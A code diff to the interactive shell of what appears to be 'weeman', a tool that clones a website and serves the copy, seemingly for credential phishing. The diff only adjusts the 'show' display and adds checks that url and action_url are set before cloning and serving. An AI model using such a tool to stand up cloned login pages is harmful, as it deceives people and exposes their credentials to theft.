@@ -70,7 +70,7 @@ def shell(quiet_mode):
                 else:
                     print_help()
             elif prompt[0] == "show":
-                l = 11 + len(url)
+                l = 20
                 sys.stdout.write("\033[01;32m\t")
                 print("-" * l)
                 print("\turl        : %s " %url)
@@ -78,8 +78,9 @@ def shell(quiet_mode):
                 print("\taction_url : %s " %(action_url))
                 print("\tuser_agent : %s " %(user_agent))
                 print("\thtml_file  : %s " %(html_file))
-                sys.stdout.write("\t\033[00m")
+                sys.stdout.write("\t")
                 print("-" * l)
+                sys.stdout.write("\033[01;00m")
             elif prompt[0] == "set":
                 if prompt[1] == "port":
                     port = int(prompt[2])
@@ -103,9 +104,15 @@ def shell(quiet_mode):
                 if prompt[1] == "html_file":
                     html_file = str(prompt[2])
             elif prompt[0] == "run" or prompt[0] == "r":
-                s = weeman(url,port)
-                s.clone()
-                s.serve()
+                if not url:
+                    printt(3, "\'url\' Can't be \'None\', please use \'set\'.")
+                elif not action_url:
+                    printt(3, "\'action_url\' Can't be \'None\', please use \'set\'.")
+                else:
+                    # Here we start the server (:
+                    s = weeman(url,port)
+                    s.clone()
+                    s.serve()
             elif prompt[0] == "banner" or prompt[0] == "b":
                 print_startup()
             else:
